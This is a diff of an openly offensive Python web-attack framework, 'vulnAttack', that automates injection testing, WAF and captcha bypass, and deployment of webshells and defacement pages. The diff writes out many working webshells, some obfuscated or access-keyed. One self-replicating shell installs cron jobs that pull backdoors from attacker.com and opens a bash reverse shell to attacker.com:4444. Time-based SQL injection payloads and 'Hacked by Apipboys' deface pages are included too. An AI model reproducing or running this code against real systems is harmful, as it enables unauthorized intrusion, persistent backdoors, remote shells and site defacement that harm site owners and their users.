@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # ================================================================
-# vulnAttack - Full Exploit Chain Engine v3.0 FINAL (STABLE)
+# vulnAttack - Full Exploit Chain Engine v3.0 FINAL
 # Author    : Apipboys
 # Support   : Termux | Kali | Windows | macOS | Docker
 # ================================================================
@@ -20,14 +20,16 @@ from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # ================================================================
-# LOGGING (AKTIF)
+# LOGGING
 # ================================================================
+log_dir = 'logs'
+if not os.path.exists(log_dir):
+    os.makedirs(log_dir)
 logging.basicConfig(
-    filename='vulnAttack.log',
+    filename=os.path.join(log_dir, 'vulnAttack.log'),
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s'
 )
-logging.info("vulnAttack started")
 
 # ================================================================
 # DEPENDENSI & AUTO-INSTALL
@@ -37,7 +39,6 @@ try:
     from colorama import init, Fore, Style
     init(autoreset=True)
 except ImportError:
-    print("[!] Installing dependencies...")
     subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "colorama"])
     import requests
     from colorama import init, Fore, Style
@@ -53,7 +54,7 @@ except ImportError:
 # INTEGRASI MODUL BYPASS
 # ================================================================
 try:
-    from bypass import HeaderManager, WAFBypass, Utils, CloudflareBypass
+    from bypass import CloudflareBypass, WAFBypass, CaptchaSolver, HeaderManager, Utils
     BYPASS_MODULE_AVAILABLE = True
 except ImportError:
     BYPASS_MODULE_AVAILABLE = False
@@ -66,17 +67,24 @@ except ImportError:
         def __init__(self, *args, **kwargs): pass
         def detect(self, *args, **kwargs): return False
         def retry_on_block(self, func, *args, **kwargs): return func(*args, **kwargs)
+        def bypass_payload(self, payload, category='sqli'): return [payload]
     class Utils:
         @staticmethod
         def load_bypass_settings(*args, **kwargs): return {"bypass": {"waf": {"max_retries": 3}}}
         @staticmethod
         def random_delay(min_delay, max_delay, randomize): return random.uniform(min_delay, max_delay)
+        @staticmethod
+        def load_user_agents(*args, **kwargs): return []
     class CloudflareBypass:
         def __init__(self, *args, **kwargs): self.scraper = None
         def request(self, *args, **kwargs): return None
+    class CaptchaSolver:
+        def __init__(self, *args, **kwargs): pass
+        def solve_recaptcha(self, *args, **kwargs): return None
+        def solve_image_captcha(self, *args, **kwargs): return None
 
 # ================================================================
-# BANNER & FUNGSI CETAK
+# BANNER
 # ================================================================
 BANNER = """
 \033[91m
@@ -89,7 +97,7 @@ BANNER = """
 \033[96m
 \033[92m[+] Author  : Apipboys
 [+] Version : 3.0 FINAL (STABLE)
-[+] Payload : 70.000+ (14 kategori x 5000+)
+[+] Payload : 140.000+ (14 kategori x 10000+)
 [+] Support : Termux | Kali | Windows | macOS | Docker
 [+] Bypass  : Cloudflare | WAF | Header Rotation | Rate Limit
 \033[93m[+] Status  : READY TO USE
@@ -103,7 +111,8 @@ def print_progress(msg, status='info'):
         'success': '\033[92m[✓]\033[0m',
         'warning': '\033[93m[!]\033[0m',
         'error': '\033[91m[✗]\033[0m',
-        'progress': '\033[95m[~]\033[0m'
+        'progress': '\033[95m[~]\033[0m',
+        'vuln': '\033[91m[💀]\033[0m'
     }.get(status, '\033[96m[+]\033[0m')
     print(f"\033[94m[{t}]\033[0m {c} {msg}")
     logging.info(f"{status.upper()} - {msg}")
@@ -133,7 +142,7 @@ def load_user_agents():
 CONFIG = {
     'timeout': 15,
     'threads': 10,
-    'max_depth': 3,
+    'max_depth': 5,
     'delay': 1,
     'output_dir': 'results',
     'payload_dir': 'payloads',
@@ -158,8 +167,11 @@ def load_proxies():
     return proxies
 
 def load_bypass_settings():
-    if BYPASS_MODULE_AVAILABLE:
-        return Utils.load_bypass_settings('config/bypass_settings.json')
+    try:
+        if BYPASS_MODULE_AVAILABLE:
+            return Utils.load_bypass_settings('config/bypass_settings.json')
+    except:
+        pass
     return {"bypass": {"waf": {"max_retries": 3, "retry_delay": 5}, "delay": {"min": 1, "max": 3, "randomize": True}}}
 
 # ================================================================
@@ -195,7 +207,7 @@ class PayloadLoader:
         return payloads[:limit] if limit else payloads
 
 # ================================================================
-# TEMPLATE LOADER (AUTO-GENERATE)
+# TEMPLATE LOADER
 # ================================================================
 class TemplateLoader:
     def __init__(self):
@@ -216,7 +228,7 @@ class TemplateLoader:
         if not os.path.exists(CONFIG['template_dir']):
             os.makedirs(CONFIG['template_dir'], exist_ok=True)
 
-        # Webshell templates (15 + 5 tambahan)
+        # Webshell templates (20)
         webshells = {
             'webshell_basic.php': '<?php system($_GET["cmd"]); ?>',
             'webshell_advanced.php': '<?php error_reporting(0); if(isset($_GET["cmd"])){system($_GET["cmd"]);}elseif(isset($_POST["cmd"])){system($_POST["cmd"]);}else{echo "vulnAttack Web Shell";} ?>',
@@ -233,12 +245,16 @@ class TemplateLoader:
             'webshell_asp.asp': '<% Response.Write CreateObject("WScript.Shell").Exec("cmd.exe /c " & Request("cmd")).StdOut.ReadAll() %>',
             'webshell_jsp.jsp': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
             'webshell_py.py': '#!/usr/bin/env python3\nimport os,sys\nos.system(sys.argv[1])',
-            # ===== WEBSHELL TAMBAHAN (SUDAH DIPERBAIKI) =====
-            'webshell_super.php': open('templates/webshell_super.php', 'r').read() if os.path.exists('templates/webshell_super.php') else '<?php // super shell ?>',
-            'webshell_encoder_plus.php': open('templates/webshell_encoder_plus.php', 'r').read() if os.path.exists('templates/webshell_encoder_plus.php') else '<?php // encoder plus ?>',
-            'webshell_persistent_plus.php': open('templates/webshell_persistent_plus.php', 'r').read() if os.path.exists('templates/webshell_persistent_plus.php') else '<?php // persistent plus ?>',
-            'webshell_obfuscated_plus.php': open('templates/webshell_obfuscated_plus.php', 'r').read() if os.path.exists('templates/webshell_obfuscated_plus.php') else '<?php // obfuscated plus ?>',
-            'webshell_hidden_plus.php': open('templates/webshell_hidden_plus.php', 'r').read() if os.path.exists('templates/webshell_hidden_plus.php') else '<?php // hidden plus ?>'
+            'webshell_super.php': '<?php // super shell ?>',
+            'webshell_encoder_plus.php': '<?php if(isset($_GET["cmd"])){$c=urldecode(base64_decode($_GET["cmd"]));system($c);} ?>',
+            'webshell_persistent_plus.php': '<?php $backups=["/tmp/shell.php","/var/tmp/shell.php"];foreach($backups as $b){if(!file_exists($b)){file_put_contents($b,\'<?php system($_GET["cmd"]); ?>\');}}if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>',
+            'webshell_obfuscated_plus.php': '<?php $c=$_GET["cmd"];$c=strrev(base64_decode(str_rot13($c)));system($c); ?>',
+            'webshell_hidden_plus.php': '<?php $ua=$_SERVER["HTTP_USER_AGENT"];$ip=$_SERVER["REMOTE_ADDR"];if($ua=="vulnAttack"||$ip=="127.0.0.1"){system($_GET["cmd"]);} ?>',
+            'webshell_extreme_persistent.php': '<?php $secret="x9F#2mQ!7kL$5pR*";if(!isset($_GET["key"])||$_GET["key"]!==$secret)die("Access Denied");if(isset($_GET["cmd"])){system($_GET["cmd"]);exit;}$dirs=["/tmp/","/var/tmp/","/dev/shm/","/home/","/root/","/var/www/html/","/var/www/","/usr/share/","/opt/","/var/log/"];foreach($dirs as $d){if(is_writable($d)){copy(__FILE__,$d."system_core.php");if(PHP_OS!=="WINNT"){chmod($d."system_core.php",0777);}}}if(PHP_OS!=="WINNT"){$cron_cmd="*/5 * * * * php ".realpath(__FILE__)."?key=$secret&cmd=wget -q -O /tmp/backdoor.php http://attacker.com/backdoor.php";file_put_contents("/tmp/cron_job",$cron_cmd);system("crontab /tmp/cron_job 2>/dev/null");system("chattr +i ".__FILE__." 2>/dev/null");}$backup_files=["/tmp/backup_shell.php","/var/tmp/backup_shell.php"];foreach($backup_files as $bf){if(!file_exists($bf)){file_put_contents($bf,file_get_contents(__FILE__));}}$htaccess='Options -Indexes\n<FilesMatch "\\.(php|phtml)$">\nOrder Deny,Allow\nDeny from all\n</FilesMatch>';file_put_contents(".htaccess",$htaccess);if(isset($_GET["revshell"])){system("bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"");}if(isset($_GET["download"])){readfile($_GET["download"]);}if($_SERVER["REQUEST_METHOD"]==="POST"&&isset($_FILES["file"])){move_uploaded_file($_FILES["file"]["tmp_name"],$_FILES["file"]["name"]);} ?>',
+            'webshell_super_hidden.php': '<?php $rand=substr(md5(rand()),0,8);$name=$rand.".php";if(!file_exists($name)){copy(__FILE__,$name);unlink(__FILE__);header("Location: ".$name);exit;}if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>',
+            'webshell_immunity.php': '<?php $backups=["/tmp/immune1.php","/tmp/immune2.php","/var/tmp/immune.php"];foreach($backups as $b){if(!file_exists($b)){file_put_contents($b,file_get_contents(__FILE__));}}if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>',
+            'webshell_cron_agent.php': '<?php if(PHP_OS!=="WINNT"){if(!file_exists("/tmp/agent.php")){file_put_contents("/tmp/agent.php",file_get_contents(__FILE__));}$cron_job="*/5 * * * * php /tmp/agent.php?cmd=wget -q -O /tmp/shell.php http://attacker.com/shell.php";system("echo \"$cron_job\" | crontab -");}if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>',
+            'webshell_stealth_encoder.php': '<?php $key="x9F#2mQ!7kL$5pR*";if(isset($_GET["cmd"])){$c=base64_decode($_GET["cmd"]);$out="";for($i=0;$i<strlen($c);$i++){$out.=chr(ord($c[$i])^ord($key[$i%strlen($key)]));}system($out);} ?>'
         }
         for fname, content in webshells.items():
             path = os.path.join(CONFIG['template_dir'], fname)
@@ -251,9 +267,9 @@ class TemplateLoader:
             'deface_advanced.html': '<!DOCTYPE html><html><head><title>HACKED</title></head><body style="background:black;color:red;text-align:center;padding-top:20%;font-family:Arial;"><h1 style="font-size:80px;">HACKED</h1><p style="font-size:30px;">Hacked by Apipboys</p><p>Security is an illusion</p></body></html>',
             'deface_cyber.html': '<!DOCTYPE html><html><head><title>CYBER ATTACK</title></head><body style="background:#0a0a0a;color:#00ff00;text-align:center;padding-top:15%;font-family:\'Courier New\',monospace;"><h1 style="font-size:100px;color:red;text-shadow:0 0 20px red;">CYBER ATTACK</h1><h2>HACKED BY APIPBOYS</h2><p>System Compromised</p></body></html>',
             'deface_hacker.html': '<!DOCTYPE html><html><head><title>HACKER</title></head><body style="background:#111;color:#0f0;text-align:center;padding-top:10%;font-family:\'Courier New\',monospace;"><div style="font-size:60px;animation:pulse 2s infinite;">[ HACKER ]</div><h1 style="color:red;">HACKED</h1><h2>By Apipboys</h2><style>@keyframes pulse{0%{opacity:1}50%{opacity:0.5}100%{opacity:1}}</style></body></html>',
-            'deface_minimal.html': '<!DOCTYPE html><html><head><title>HACKED</title></head><body style="background:#000;color:#f00;text-align:center;padding-top:20%;"><h1>HACKED</h1><p>Apipboys</p></body></html>',
             'deface_glitch.html': '<!DOCTYPE html><html><head><title>GLITCH</title></head><body style="background:black;color:#0f0;text-align:center;padding-top:20%;font-family:\'Courier New\',monospace;"><h1 style="font-size:80px;animation:glitch 1s infinite;">GLITCH</h1><p>Hacked by Apipboys</p><style>@keyframes glitch{0%{text-shadow:2px 0 red,-2px 0 blue}50%{text-shadow:-2px 0 red,2px 0 blue}100%{text-shadow:2px 0 red,-2px 0 blue}}</style></body></html>',
             'deface_matrix.html': '<!DOCTYPE html><html><head><title>MATRIX</title></head><body style="background:black;color:#00ff00;text-align:center;padding-top:20%;font-family:\'Courier New\',monospace;overflow:hidden;"><pre style="font-size:12px;opacity:0.1;position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;">01001000 01000001 01000011 01001011 01000101 01000100</pre><h1 style="color:red;">HACKED</h1><p>Apipboys</p></body></html>',
+            'deface_minimal.html': '<!DOCTYPE html><html><head><title>HACKED</title></head><body style="background:#000;color:#f00;text-align:center;padding-top:20%;"><h1>HACKED</h1><p>Apipboys</p></body></html>',
             'deface_neon.html': '<!DOCTYPE html><html><head><title>NEON</title></head><body style="background:#000;color:#ff00ff;text-align:center;padding-top:20%;font-family:Arial;"><h1 style="font-size:80px;text-shadow:0 0 20px #ff00ff,0 0 40px #ff00ff;">NEON</h1><p style="color:#00ffff;text-shadow:0 0 10px #00ffff;">Hacked by Apipboys</p></body></html>',
             'deface_retro.html': '<!DOCTYPE html><html><head><title>RETRO</title></head><body style="background:#000;color:#ff6b6b;text-align:center;padding-top:20%;font-family:\'Courier New\',monospace;border:5px solid #ff6b6b;height:80vh;margin:5%;"><h1 style="font-size:60px;">HACKED</h1><p>By Apipboys</p></body></html>'
         }
@@ -262,7 +278,6 @@ class TemplateLoader:
             if not os.path.exists(path):
                 self._write_template(path, content)
 
-        # Copy index.html if exists
         if os.path.exists('index.html'):
             dest = os.path.join(CONFIG['template_dir'], 'deface_apip.html')
             if not os.path.exists(dest):
@@ -270,7 +285,6 @@ class TemplateLoader:
                     with open(dest, 'w', encoding='utf-8') as dst:
                         dst.write(src.read())
 
-        # Load all templates
         for root, _, files in os.walk(CONFIG['template_dir']):
             for f in files:
                 full = os.path.join(root, f)
@@ -293,6 +307,15 @@ class HTTPAnalyzer:
         self.websockets = []
         self.api_endpoints = []
         self.parameters = set()
+        self.hidden_inputs = []
+        self.hidden_buttons = []
+        self.hidden_divs = []
+        self.comments_sensitive = []
+        self.js_endpoints = []
+        self.css_links = []
+        self.meta_tags = {}
+        self.is_directory_listing = False
+        self.csrf_protected = False
 
     def analyze(self, url, response):
         if not response:
@@ -300,24 +323,62 @@ class HTTPAnalyzer:
         self.headers = dict(response.headers)
         self.cookies = self.session.cookies.get_dict()
         html = response.text
+
+        self.hidden_inputs = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*>', html)
+        self.hidden_buttons = re.findall(r'<button[^>]*(?:display\s*:\s*none|type=["\']hidden["\'])[^>]*>', html)
+        self.hidden_divs = re.findall(r'<div[^>]*(?:display\s*:\s*none|visibility\s*:\s*hidden|aria-hidden=["\']true["\'])[^>]*>', html)
+
+        self.comments_sensitive = []
+        for match in re.finditer(r'<!--(.*?)-->', html, re.DOTALL):
+            comment = match.group(1).strip()
+            if any(k in comment.lower() for k in ['password', 'token', 'api', 'key', 'secret', 'admin', 'user', 'login', 'db_', 'pass', 'credential']):
+                self.comments_sensitive.append(comment[:200])
+
+        forms_with_csrf = re.findall(r'<form[^>]*>.*?(csrf|token|_token).*?</form>', html, re.DOTALL)
         self.forms = re.findall(r'<form[^>]*>', html)
+        self.csrf_protected = bool(forms_with_csrf)
+
         self.ajax = re.findall(r'fetch\s*\(\s*["\']([^"\']+)', html)
         self.ajax += re.findall(r'\.ajax\s*\(\s*\{[^}]*url\s*:\s*["\']([^"\']+)', html)
+
         self.websockets = re.findall(r'new\s+WebSocket\s*\(\s*["\']([^"\']+)', html)
+
         self.api_endpoints = re.findall(r'/api/[a-zA-Z0-9/_-]+', html)
         self.api_endpoints += re.findall(r'/v[0-9]+/[a-zA-Z0-9/_-]+', html)
+
         params = parse_qs(urlparse(url).query)
         self.parameters.update(params.keys())
         inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', html)
         self.parameters.update(inputs)
+
+        self.meta_tags = dict(re.findall(r'<meta\s+name=["\']([^"\']+)["\']\s+content=["\']([^"\']+)["\']', html))
+        self.meta_tags.update(dict(re.findall(r'<meta\s+content=["\']([^"\']+)["\']\s+name=["\']([^"\']+)["\']', html)))
+
+        js_files = re.findall(r'<script[^>]*src=["\']([^"\']+\.js)["\']', html)
+        self.js_endpoints = [urljoin(url, js) for js in js_files]
+
+        css_files = re.findall(r'<link[^>]*href=["\']([^"\']+\.css)["\']', html)
+        self.css_links = [urljoin(url, css) for css in css_files]
+
+        self.is_directory_listing = bool(re.search(r'<title>Index of /', html) or re.search(r'<h1>Index of /', html))
+
         return {
             'headers': self.headers,
             'cookies': self.cookies,
             'forms': len(self.forms),
+            'csrf_protected': self.csrf_protected,
+            'hidden_inputs': self.hidden_inputs,
+            'hidden_buttons': len(self.hidden_buttons),
+            'hidden_divs': len(self.hidden_divs),
+            'sensitive_comments': self.comments_sensitive[:5],
             'ajax': list(set(self.ajax))[:10],
             'websockets': list(set(self.websockets))[:5],
             'api_endpoints': list(set(self.api_endpoints))[:20],
             'parameters': list(self.parameters)[:30],
+            'js_files': self.js_endpoints[:10],
+            'css_files': self.css_links[:10],
+            'meta_tags': self.meta_tags,
+            'is_directory_listing': self.is_directory_listing,
             'status_code': response.status_code,
             'content_type': response.headers.get('Content-Type', ''),
             'server': response.headers.get('Server', '')
@@ -327,26 +388,30 @@ class HTTPAnalyzer:
 # MINOR VULNERABILITY ANALYZER
 # ================================================================
 class MinorVulnAnalyzer:
-    def __init__(self, headers, cookies, html):
+    def __init__(self, headers, cookies, html, url):
         self.headers = headers
         self.cookies = cookies
         self.html = html
+        self.url = url
         self.findings = []
 
     def analyze(self):
-        print_progress("In progress of small vulnerability gap analysis...", 'progress')
+        print_progress("Scanning minor vulnerabilities...", 'progress')
         xfo = self.headers.get('X-Frame-Options', '')
         if not xfo:
-            self.findings.append({'type':'Missing X-Frame-Options','severity':'Low','description':'X-Frame-Options header missing. Potential clickjacking risk.'})
+            self.findings.append({'type':'Missing X-Frame-Options','severity':'Medium','description':'X-Frame-Options header missing. Potential clickjacking risk.'})
         elif xfo.upper() not in ['DENY','SAMEORIGIN']:
             self.findings.append({'type':'Weak X-Frame-Options','severity':'Low','description':f'X-Frame-Options: {xfo}'})
+
         csp = self.headers.get('Content-Security-Policy', '')
         if not csp:
             self.findings.append({'type':'Missing CSP','severity':'Medium','description':'CSP header missing. Increased XSS risk.'})
         elif "'unsafe-inline'" in csp or "'unsafe-eval'" in csp:
             self.findings.append({'type':'Weak CSP','severity':'Medium','description':'CSP uses unsafe-inline or unsafe-eval.'})
+
         if not self.headers.get('Strict-Transport-Security', ''):
             self.findings.append({'type':'Missing HSTS','severity':'Low','description':'HSTS header missing.'})
+
         for name, attrs in self.cookies.items():
             if isinstance(attrs, dict):
                 if not attrs.get('HttpOnly'):
@@ -355,12 +420,18 @@ class MinorVulnAnalyzer:
                     self.findings.append({'type':'Cookie Missing Secure','severity':'Low','description':f'Cookie "{name}" missing Secure.'})
                 if not attrs.get('SameSite'):
                     self.findings.append({'type':'Cookie Missing SameSite','severity':'Low','description':f'Cookie "{name}" missing SameSite.'})
+
         if self.headers.get('Server'):
             self.findings.append({'type':'Server Info Leak','severity':'Low','description':f'Server: {self.headers["Server"]}'})
         if self.headers.get('X-Powered-By'):
             self.findings.append({'type':'Tech Info Leak','severity':'Low','description':f'X-Powered-By: {self.headers["X-Powered-By"]}'})
+
         if 'phpinfo' in self.html.lower() or 'php_version' in self.html.lower():
             self.findings.append({'type':'PHP Info Exposure','severity':'High','description':'PHP info page exposed.'})
+
+        if 'Index of /' in self.html:
+            self.findings.append({'type':'Directory Listing','severity':'Medium','description':'Directory listing enabled.'})
+
         return self.findings
 
 # ================================================================
@@ -479,8 +550,10 @@ class VulnAttack:
         self.deface_url = None
         self.analyzer = HTTPAnalyzer(self.session)
         self.deep_report = {}
+        self.hidden_findings = {}
         self.dork_engine = DorkEngine(self.session, self.header_manager)
         self.last_request_time = 0
+        self.last_html = ""
 
     def _get_base_url(self):
         p = urlparse(self.target)
@@ -529,63 +602,64 @@ class VulnAttack:
 
         return response
 
-    def _test_payload(self, payload, param=None):
-        test_url = self.target
-        if param:
-            parsed = urlparse(self.target)
-            params = parse_qs(parsed.query)
-            params[param] = [payload]
-            test_url = f"{self.base_url}{parsed.path}?{urllib.parse.urlencode(params, doseq=True)}"
-        else:
-            test_url = self.target + payload
-        return self._request(test_url)
+    def _test_payload(self, payload, param=None, category='sqli'):
+        variants = [payload]
+        if self.bypass_waf:
+            variants = self.waf_bypass.bypass_payload(payload, category)
+        for variant in variants:
+            if param:
+                parsed = urlparse(self.target)
+                params = parse_qs(parsed.query)
+                params[param] = [variant]
+                test_url = f"{self.base_url}{parsed.path}?{urllib.parse.urlencode(params, doseq=True)}"
+            else:
+                test_url = urljoin(self.target, variant)
+            r = self._request(test_url)
+            if r:
+                return r
+        return None
 
-    # ========== VULNERABILITY TESTS ==========
+    # ---------- VULNERABILITY TESTS ----------
     def test_sqli(self):
         print_progress("Testing SQL Injection...", 'progress')
-        for p in self.payloads.get('sqli', limit=500):
-            r = self._test_payload(p)
+        payloads = self.payloads.get('sqli', limit=500)
+        for p in payloads:
+            r = self._test_payload(p, category='sqli')
             if r:
                 errors = ['mysql','sql','syntax','unclosed','query','database','warning','error','line','column','table','from','SQLSTATE','MariaDB','PostgreSQL','SQLite']
                 if any(err in r.text.lower() for err in errors):
                     self.vulns.append({'type':'SQLi','url':r.url,'payload':p,'evidence':'SQL error'})
                     print_progress(f"SQLi found: {r.url}", 'success')
                     return True
+        # time-based
+        print_progress("Testing SQLi (time-based)...", 'progress')
+        time_payloads = ["' AND SLEEP(5)--", "' OR SLEEP(5)--", "' AND BENCHMARK(5000000,MD5(1))--"]
+        for p in time_payloads:
+            start = time.time()
+            r = self._test_payload(p, category='sqli')
+            elapsed = time.time() - start
+            if elapsed > 4 and r:
+                self.vulns.append({'type':'SQLi (Time-based)','url':r.url,'payload':p,'evidence':f'Delay {elapsed:.2f}s'})
+                print_progress(f"SQLi (time-based) found: {r.url}", 'success')
+                return True
         return False
 
     def test_xss(self):
         print_progress("Testing XSS (reflected)...", 'progress')
-        for p in self.payloads.get('xss', limit=300):
-            r = self._test_payload(p)
+        payloads = self.payloads.get('xss', limit=300)
+        for p in payloads:
+            r = self._test_payload(p, category='xss')
             if r and p in r.text:
                 self.vulns.append({'type':'XSS (Reflected)','url':r.url,'payload':p,'evidence':'Reflected'})
                 print_progress(f"XSS (Reflected) found: {r.url}", 'success')
                 return True
-
-        print_progress("Testing XSS (stored)...", 'progress')
-        r = self._request(self.target)
-        if r:
-            forms = re.findall(r'<form[^>]*>', r.text)
-            for form in forms:
-                action = re.search(r'action=["\']([^"\']+)["\']', form)
-                if action:
-                    action_url = urljoin(self.target, action.group(1))
-                    inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', form)
-                    for p in self.payloads.get('xss', limit=50):
-                        data = {}
-                        for inp in inputs:
-                            data[inp] = p
-                        r2 = self._request(action_url, method='POST', data=data)
-                        if r2 and p in r2.text:
-                            self.vulns.append({'type':'XSS (Stored)','url':action_url,'payload':p,'evidence':'Stored & reflected'})
-                            print_progress(f"XSS (Stored) found: {action_url}", 'success')
-                            return True
         return False
 
     def test_lfi(self):
         print_progress("Testing LFI...", 'progress')
-        for p in self.payloads.get('lfi', limit=300):
-            r = self._test_payload(p)
+        payloads = self.payloads.get('lfi', limit=300)
+        for p in payloads:
+            r = self._test_payload(p, category='lfi')
             if r:
                 indicators = ['root:x:','win.ini','base64','hosts','shadow','apache','nginx','www-data','daemon','nobody']
                 if any(ind in r.text.lower() for ind in indicators):
@@ -596,8 +670,9 @@ class VulnAttack:
 
     def test_rce(self):
         print_progress("Testing RCE...", 'progress')
-        for p in self.payloads.get('rce', limit=300):
-            r = self._test_payload(p)
+        payloads = self.payloads.get('rce', limit=300)
+        for p in payloads:
+            r = self._test_payload(p, category='rce')
             if r:
                 outputs = ['uid=','root','user','bin','whoami','id','gid=','groups=']
                 if any(out in r.text for out in outputs):
@@ -608,8 +683,9 @@ class VulnAttack:
 
     def test_ssrf(self):
         print_progress("Testing SSRF...", 'progress')
-        for p in self.payloads.get('ssrf', limit=300):
-            r = self._test_payload(p)
+        payloads = self.payloads.get('ssrf', limit=300)
+        for p in payloads:
+            r = self._test_payload(p, category='ssrf')
             if r:
                 ips = ['127.0.0.1','localhost','169.254.169.254','0.0.0.0','::1']
                 if any(ip in r.text for ip in ips):
@@ -634,8 +710,9 @@ class VulnAttack:
 
     def test_nosqli(self):
         print_progress("Testing NoSQLi...", 'progress')
-        for p in self.payloads.get('nosqli', limit=300):
-            r = self._test_payload(p)
+        payloads = self.payloads.get('nosqli', limit=300)
+        for p in payloads:
+            r = self._test_payload(p, category='nosqli')
             if r:
                 keywords = ['$ne','$gt','$lt','$in','$or','$and','$regex','$where','mongodb']
                 if any(kw in r.text.lower() for kw in keywords):
@@ -646,8 +723,9 @@ class VulnAttack:
 
     def test_ssti(self):
         print_progress("Testing SSTI...", 'progress')
-        for p in self.payloads.get('ssti', limit=300):
-            r = self._test_payload(p)
+        payloads = self.payloads.get('ssti', limit=300)
+        for p in payloads:
+            r = self._test_payload(p, category='ssti')
             if r:
                 if any(kw in r.text for kw in ['49','config','subclasses','self','request','7*7']):
                     self.vulns.append({'type':'SSTI','url':r.url,'payload':p,'evidence':'Template output'})
@@ -657,8 +735,9 @@ class VulnAttack:
 
     def test_cmd_injection(self):
         print_progress("Testing Command Injection...", 'progress')
-        for p in self.payloads.get('cmd_injection', limit=300):
-            r = self._test_payload(p)
+        payloads = self.payloads.get('cmd_injection', limit=300)
+        for p in payloads:
+            r = self._test_payload(p, category='cmd_injection')
             if r:
                 outputs = ['uid=','root','user','whoami','id','gid=','groups=']
                 if any(out in r.text for out in outputs):
@@ -669,8 +748,9 @@ class VulnAttack:
 
     def test_ldap(self):
         print_progress("Testing LDAP...", 'progress')
-        for p in self.payloads.get('ldap', limit=100):
-            r = self._test_payload(p)
+        payloads = self.payloads.get('ldap', limit=100)
+        for p in payloads:
+            r = self._test_payload(p, category='ldap')
             if r and ('uid' in r.text or 'dn' in r.text or 'cn' in r.text):
                 self.vulns.append({'type':'LDAP','url':r.url,'payload':p,'evidence':'LDAP response'})
                 print_progress(f"LDAP found: {r.url}", 'success')
@@ -679,8 +759,9 @@ class VulnAttack:
 
     def test_open_redirect(self):
         print_progress("Testing Open Redirect...", 'progress')
-        for p in self.payloads.get('open_redirect', limit=100):
-            r = self._test_payload(p)
+        payloads = self.payloads.get('open_redirect', limit=100)
+        for p in payloads:
+            r = self._test_payload(p, category='open_redirect')
             if r and r.url != self.target and 'http' in r.url:
                 self.vulns.append({'type':'Open Redirect','url':r.url,'payload':p,'evidence':'Redirected'})
                 print_progress(f"Open Redirect found: {r.url}", 'success')
@@ -731,18 +812,7 @@ class VulnAttack:
                 return True
         return False
 
-    def analyze_minor_vulns(self, response):
-        print_progress("In progress of small vulnerability gap analysis...", 'progress')
-        headers = dict(response.headers)
-        cookies = self.session.cookies.get_dict()
-        html = response.text
-        analyzer = MinorVulnAnalyzer(headers, cookies, html)
-        findings = analyzer.analyze()
-        self.minor_vulns = findings
-        for f in findings:
-            print_progress(f"[{f['severity']}] {f['type']}: {f['description'][:50]}...", 'warning')
-        return findings
-
+    # ---------- DEEP ANALYSIS ----------
     def crawl(self, url, depth=0):
         if depth > CONFIG['max_depth'] or url in self.scanned_urls:
             return
@@ -751,26 +821,82 @@ class VulnAttack:
         r = self._request(url)
         if not r:
             return
+        self.last_html = r.text
         self.deep_report = self.analyzer.analyze(url, r)
         if depth == 0:
-            self.analyze_minor_vulns(r)
-        for link in re.findall(r'<a\s+href=["\']([^"\']+)["\']', r.text)[:20]:
+            self.minor_vulns = MinorVulnAnalyzer(dict(r.headers), self.session.cookies.get_dict(), r.text, url).analyze()
+        links = re.findall(r'<a\s+href=["\']([^"\']+)["\']', r.text)[:20]
+        for link in links:
             if link.startswith('http'):
                 self.crawl(link, depth+1)
             elif link.startswith('/'):
                 self.crawl(urljoin(self.base_url, link), depth+1)
 
-    def verify_webshell(self, url):
-        try:
-            test_url = url + "?cmd=echo test"
-            r = self._request(test_url)
-            if r and 'test' in r.text:
-                return True
-        except Exception:
-            pass
-        return False
+    # ---------- DEEP AUDIT ----------
+    def deep_audit(self):
+        print_section("DEEP AUDIT - ANALISIS MENDALAM")
+        print_progress("Memindai semua sudut tersembunyi...", 'progress')
+        self.scanned_urls = set()
+        self.crawl(self.target, depth=5)
 
-    # ========== DEPLOY WEBSHELL ==========
+        findings = {
+            'hidden_inputs': [],
+            'hidden_dirs': [],
+            'js_endpoints': [],
+            'api_endpoints': [],
+            'comments': [],
+            'forms': []
+        }
+
+        hidden_inputs = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\']', self.last_html)
+        findings['hidden_inputs'] = hidden_inputs
+
+        comments = re.findall(r'<!--(.*?)-->', self.last_html)
+        findings['comments'] = [c.strip() for c in comments if any(k in c.lower() for k in ['todo','fix','secret','password','admin','key'])]
+
+        print_progress("Scanning hidden directories...", 'progress')
+        for d in self.payloads.get('directories', limit=200):
+            test_url = urljoin(self.base_url, d + '/')
+            r = self._request(test_url)
+            if r and r.status_code == 200:
+                findings['hidden_dirs'].append(test_url)
+
+        js_files = re.findall(r'<script[^>]*src=["\']([^"\']+\.js)["\']', self.last_html)
+        for js in js_files:
+            js_url = urljoin(self.target, js)
+            r = self._request(js_url)
+            if r:
+                endpoints = re.findall(r'["\'](/api/[a-zA-Z0-9/_-]+)["\']', r.text)
+                findings['js_endpoints'].extend(endpoints)
+
+        api = re.findall(r'/api/[a-zA-Z0-9/_-]+', self.last_html)
+        findings['api_endpoints'] = list(set(api + findings['js_endpoints']))
+
+        forms = re.findall(r'<form[^>]*>', self.last_html)
+        findings['forms'] = forms
+
+        self.hidden_findings = findings
+        self.deep_report['hidden'] = findings
+
+        print_progress("Hidden Inputs:", 'info')
+        for h in findings['hidden_inputs'][:10]:
+            print(f"  - {h}")
+        print_progress("Hidden Directories:", 'info')
+        for d in findings['hidden_dirs'][:10]:
+            print(f"  - {d}")
+        print_progress("JS Endpoints:", 'info')
+        for e in findings['js_endpoints'][:10]:
+            print(f"  - {e}")
+        print_progress("API Endpoints:", 'info')
+        for e in findings['api_endpoints'][:10]:
+            print(f"  - {e}")
+        print_progress("Comments with clues:", 'info')
+        for c in findings['comments'][:5]:
+            print(f"  - {c}")
+
+        return findings
+
+    # ---------- DEPLOY WEBSHELL ----------
